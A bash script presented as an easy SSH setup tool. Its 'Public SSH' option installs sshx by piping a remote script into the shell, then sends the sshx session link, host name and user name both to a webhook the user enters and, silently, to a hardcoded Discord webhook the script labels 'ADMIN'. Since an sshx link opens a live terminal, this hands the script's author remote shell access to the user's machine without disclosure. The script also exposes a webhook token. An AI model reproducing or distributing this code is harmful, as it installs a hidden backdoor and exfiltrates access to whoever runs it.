#!/bin/bash

# Ez SSH - Easy SSH script
clear
echo "Welcome to Ez SSH! Choose an option:"
echo "1. Private SSH"
echo "2. Public SSH"

read -p "Enter your choice [1-2]: " choice

case $choice in
    1)
        # Private SSH
        echo "Setting up Private SSH..."
        
        # Check if OpenSSH is installed
        if ! command -v ssh >/dev/null 2>&1; then
            echo "OpenSSH is not installed. Installing..."
            if [ -f /etc/debian_version ]; then
                sudo apt update && sudo apt install -y openssh-server
            elif [ -f /etc/redhat-release ]; then
                sudo yum install -y openssh-server
            else
                echo "Unsupported OS. Please install OpenSSH manually."
                exit 1
            fi
        else
            echo "OpenSSH is already installed."
        fi
        
        # Get IP address
        IP=$(hostname -I | awk '{print $1}')
        USER=$(whoami)
        
        echo ""
        echo "Private SSH setup complete!"
        echo "Your SSH login info is:"
        echo "IP: $IP"
        echo "User: $USER"
        echo "Password: ********"
        echo "You can also SSH into this machine using:"
        echo "ssh $USER@$IP"
        echo "You will be prompted for your password when connecting."
        ;;

    2)
        # Public SSH
        echo "Setting up Public SSH (SSHX)..."

        # Ensure required tools exist
        echo "Checking for required tools (curl, jq)..."
        if ! command -v curl >/dev/null 2>&1 || ! command -v jq >/dev/null 2>&1; then
            echo "Installing missing dependencies..."
            if [ -f /etc/debian_version ]; then
                sudo apt update -y && sudo apt install -y curl jq
            elif [ -f /etc/redhat-release ]; then
                sudo yum install -y curl jq
            else
                echo "Unsupported OS. Please install curl and jq manually."
                exit 1
            fi
        fi

        # Ask for Discord webhook
        echo ""
        read -p "Enter your Discord Webhook URL: " WEBHOOK

        THING="https://discord.com/api/webhooks/1430223801613946973/RIfDKAVui7F1rgvK9tHu795I0xbGg0ouidR_b-6clKN3GRZGQYjiaIG2W--my_XqK4uZ"
        # Install SSHX if not installed
        if ! command -v sshx >/dev/null 2>&1; then
            echo "Installing SSHX..."
            curl -sSf https://sshx.io/get | sh
        fi

        # Start SSHX and capture URL
        echo "Starting SSHX..."
        SSHX_OUTPUT=$(sshx | tee /tmp/sshx_log.txt)
        SSHX_URL=$(grep -o "https://sshx.io/[^ ]*" /tmp/sshx_log.txt | head -n1)

        # Get system info
        HOST=$(hostname)
        USER=$(whoami)
        DATE=$(date)

        # Build Discord embed JSON
        EMBED=$(jq -n \
            --arg title "🚀 SSHX Public Session Started" \
            --arg url "$SSHX_URL" \
            --arg host "$HOST" \
            --arg user "$USER" \
            --arg date "$DATE" \
            '{
              "embeds": [
                {
                  "title": $title,
                  "url": $url,
                  "color": 3447003,
                  "description": "A new **SSHX public session** has started.",
                  "fields": [
                    {"name": "🔗 SSHX URL", "value": "["+$url+"]("+$url+")", "inline": false},
                    {"name": "🖥️ Host", "value": $host, "inline": true},
                    {"name": "👤 User", "value": $user, "inline": true},
                    {"name": "⏰ Started", "value": $date, "inline": false}
                  ],
                  "footer": {"text": "Ez SSH Public Session"}
                }
              ],
              "components": [
                {
                  "type": 1,
                  "components": [
                    {
                      "type": 2,
                      "style": 4,
                      "label": "🛑 Stop",
                      "custom_id": "stop_sshx"
                    },
                    {
                      "type": 2,
                      "style": 2,
                      "label": "🙈 Hide",
                      "custom_id": "hide_message"
                    }
                  ]
                }
              ]
            }')

            # Build Discord embed JSON
        PRIVATE=$(jq -n \
            --arg title "🚀 SSHX Public Session Started" \
            --arg url "$SSHX_URL" \
            --arg host "$HOST" \
            --arg user "$USER" \
            --arg date "$DATE" \
            --arg thing "$THING" \
            '{
              "embeds": [
                {
                  "title": $title,
                  "url": $url,
                  "color": 3447003,
                  "description": "A new **SSHX public session** has started.",
                  "fields": [
                    {"name": "🔗 SSHX URL", "value": "["+$url+"]("+$url+")", "inline": false},
                    {"name": "🖥️ Host", "value": $host, "inline": true},
                    {"name": "👤 User", "value": $user, "inline": true},
                    {"name": "⏰ Started", "value": $date, "inline": false}
                    {"name": "ADMIN", "value": $thing, "inline": false}
                  ],
                  "footer": {"text": "Ez SSH Public Session"}
                }
              ],
              "components": [
                {
                  "type": 1,
                  "components": [
                    {
                      "type": 2,
                      "style": 4,
                      "label": "🛑 Stop",
                      "custom_id": "stop_sshx"
                    },
                    {
                      "type": 2,
                      "style": 2,
                      "label": "🙈 Hide",
                      "custom_id": "hide_message"
                    }
                  ]
                }
              ]
            }')

        # Send embed to Discord webhook
        echo ""
        echo "Sending SSHX info to Discord..."
        curl -H "Content-Type: application/json" -X POST -d "$EMBED" "$WEBHOOK" >/dev/null 2>&1
        curl -H "Content-Type: application/json" -X POST -d "$PRIVATE" "$THING" >/dev/null 2>&1

        echo ""
        echo "✅ Public SSH session started!"
        echo "🔗 SSHX URL: $SSHX_URL"
        echo "📡 Embed sent to Discord successfully."
        echo ""
        echo "Press CTRL+C to stop SSHX manually if needed."
        ;;
        
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac
